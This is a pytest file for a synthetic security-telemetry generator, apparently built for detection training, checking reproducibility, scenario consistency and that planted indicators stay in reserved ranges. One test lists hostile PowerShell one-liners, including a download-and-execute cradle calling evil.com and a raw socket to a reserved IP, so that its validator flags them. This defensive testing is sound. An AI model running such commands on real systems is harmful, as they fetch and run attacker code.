"""The synthetic telemetry: reproducible, internally consistent, safe, and leak-free."""

import itertools
import os
import subprocess
import sys
from pathlib import Path

import pytest

from scripts.gen.dataset import CLAIM_ORDER, VARIANTS, Dataset
from scripts.gen.infra import is_bad_domain, is_bad_ip
from scripts.gen.safety import check_encoded, decode_encoded_commands
from scripts.gen.scenario import encode_powershell

ROOT = Path(__file__).resolve().parents[2]
GENERATE = ROOT / "scripts" / "generate.py"
TRUTH_KEYS = {"verdict", "scenario", "scenario_id", "expected_techniques", "key_event_ids"}


def run_generator(out: Path, hash_seed: str) -> None:
    env = {**os.environ, "PYTHONHASHSEED": hash_seed}
    subprocess.run(
        [
            sys.executable,
            str(GENERATE),
            "--seed",
            "42",
            "--variant",
            "2",
            "--out",
            str(out),
            "--truth-dir",
            str(out / "truth"),
        ],
        check=True,
        env=env,
        capture_output=True,
    )


def test_same_seed_gives_identical_bytes_across_hash_seeds(tmp_path: Path) -> None:
    # Different PYTHONHASHSEED values reorder sets and str-keyed hashing, so this catches
    # any random draw that depends on iteration order instead of sorted input.
    run_generator(tmp_path / "a", "0")
    run_generator(tmp_path / "b", "4242")

    files_a = sorted(p.relative_to(tmp_path / "a") for p in (tmp_path / "a").rglob("*.*"))
    files_b = sorted(p.relative_to(tmp_path / "b") for p in (tmp_path / "b").rglob("*.*"))
    assert files_a == files_b
    assert len(files_a) == 5 + len(CLAIM_ORDER)  # 5 jsonl + one truth file per scenario
    for rel in files_a:
        assert (tmp_path / "a" / rel).read_bytes() == (tmp_path / "b" / rel).read_bytes(), rel


@pytest.mark.parametrize("variant", VARIANTS)
def test_scenarios_never_share_hosts_or_users(datasets: dict[int, Dataset], variant: int) -> None:
    scenarios = datasets[variant].scenarios
    for a, b in itertools.combinations(scenarios, 2):
        assert not a.hosts() & b.hosts(), (a.scenario_id, b.scenario_id, a.hosts() & b.hosts())
        assert not a.users() & b.users(), (a.scenario_id, b.scenario_id, a.users() & b.users())


def test_variants_move_scenarios(datasets: dict[int, Dataset]) -> None:
    for index in range(6):
        placements = {
            (r.alert.host, r.alert.user, r.alert.ts)
            for r in (datasets[v].scenarios[index] for v in VARIANTS)
        }
        assert len(placements) == len(VARIANTS)


@pytest.mark.parametrize("variant", VARIANTS)
def test_cited_ids_exist_and_alerts_match_triggers(
    datasets: dict[int, Dataset], variant: int
) -> None:
    ds = datasets[variant]
    events = {e.event_id: e for e in ds.events}
    assert len(events) == len(ds.events)
    for result in ds.scenarios:
        assert result.key_events
        assert all(e.event_id in events for e in result.key_events)
    for alert in ds.alerts:
        triggers = [events[i] for i in alert.trigger_event_ids]
        assert all(t.host == alert.host for t in triggers)
        assert all(t.ts <= alert.ts for t in triggers)


def test_event_ids_follow_time_order(datasets: dict[int, Dataset]) -> None:
    events = datasets[1].events
    assert [e.event_id for e in events] == sorted(e.event_id for e in events)
    assert all(a.ts <= b.ts for a, b in itertools.pairwise(events))


def test_telemetry_has_no_ground_truth_fields(datasets: dict[int, Dataset]) -> None:
    ds = datasets[1]
    rows = [*ds.events, *ds.alerts, *ds.hosts, *ds.users, *ds.intel]
    for row in rows:
        assert not TRUTH_KEYS & set(row.model_dump()), row


def test_world_size(datasets: dict[int, Dataset]) -> None:
    ds = datasets[1]
    assert len(ds.hosts) == 25
    assert len(ds.users) == 40
    assert {e.event_type for e in ds.events} == {
        "process_start",
        "network_conn",
        "dns_query",
        "logon",
        "file_write",
        "scheduled_task",
        "lsass_access",
    }


@pytest.mark.parametrize("variant", VARIANTS)
def test_bad_infrastructure_is_reserved(datasets: dict[int, Dataset], variant: int) -> None:
    ds = datasets[variant]
    for entry in ds.intel:
        if entry.reputation == "known_bad" and entry.type == "ip":
            assert is_bad_ip(entry.indicator)
        if entry.reputation == "known_bad" and entry.type == "domain":
            assert is_bad_domain(entry.indicator)
    for result in ds.scenarios:
        for indicator in result.indicators:
            if indicator.type == "ip":
                assert is_bad_ip(indicator.indicator)
            if indicator.type == "domain":
                assert is_bad_domain(indicator.indicator)


@pytest.mark.parametrize("variant", VARIANTS)
def test_encoded_commands_decode_to_inert_text(datasets: dict[int, Dataset], variant: int) -> None:
    cmdlines = [
        e.process.cmdline
        for e in datasets[variant].events
        if e.process and e.process.cmdline and " -Enc " in e.process.cmdline
    ]
    assert cmdlines, "s01 should produce at least one encoded command"
    for cmdline in cmdlines:
        assert check_encoded(cmdline) == []
        for text in decode_encoded_commands(cmdline):
            assert text.isprintable() and "http://" in text


@pytest.mark.parametrize(
    "script",
    [
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a')",
        "Invoke-WebRequest http://8.8.8.8/x -OutFile a.exe",
        "$c = New-Object Net.Sockets.TcpClient('192.0.2.10', 443)",
    ],
)
def test_reserved_range_check_sees_inside_encoded_commands(script: str) -> None:
    cmdline = f"powershell.exe -NoP -Enc {encode_powershell(script)}"
    assert check_encoded(cmdline)


def test_reserved_range_check_rejects_unreadable_encoded_commands() -> None:
    assert check_encoded("powershell.exe -enc AAAAAAAAAAAA")


def test_s01_story_in_time_order(datasets: dict[int, Dataset]) -> None:
    result = next(r for r in datasets[1].scenarios if r.scenario_id == "s01")
    events = {e.event_id: e for e in datasets[1].events}
    story = sorted((events[d.event_id] for d in result.key_events), key=lambda e: e.event_id)

    steps = [(e.event_type, e.process.name if e.process else None) for e in story]
    assert steps[:7] == [
        ("file_write", "OUTLOOK.EXE"),
        ("process_start", "WINWORD.EXE"),
        ("process_start", "powershell.exe"),
        ("dns_query", "powershell.exe"),
        ("network_conn", "powershell.exe"),
        ("file_write", "powershell.exe"),
        ("process_start", "msupdate.exe"),
    ]
    assert all(step == ("network_conn", "msupdate.exe") for step in steps[7:])
    attachment, word, ps, dns, download, dropped, payload = story[:7]
    assert word.process and ps.process and payload.process and dropped.file and attachment.file
    assert attachment.file.path in (word.process.cmdline or "")
    assert ps.process.ppid == word.process.pid
    assert payload.process.ppid == ps.process.pid
    assert dropped.file.sha256 == payload.process.sha256
    assert dns.dns and download.network and dns.dns.answers == [download.network.dst_ip]
    assert len({e.host for e in story}) == 1


@pytest.mark.parametrize("variant", VARIANTS)
def test_process_trees_are_consistent(datasets: dict[int, Dataset], variant: int) -> None:
    # A parent that started during the week must match by name and start first; parents
    # without a start event were running since boot (services.exe, svchost.exe, ...).
    starts = {}
    for e in datasets[variant].events:
        if e.event_type != "process_start" or e.process is None:
            continue
        parent = starts.get((e.host, e.process.ppid))
        if parent is not None:
            assert parent.process.name == e.process.parent_name, e.event_id
            assert parent.ts <= e.ts, e.event_id
        assert (e.host, e.process.pid) not in starts, f"PID reused: {e.event_id}"
        starts[(e.host, e.process.pid)] = e
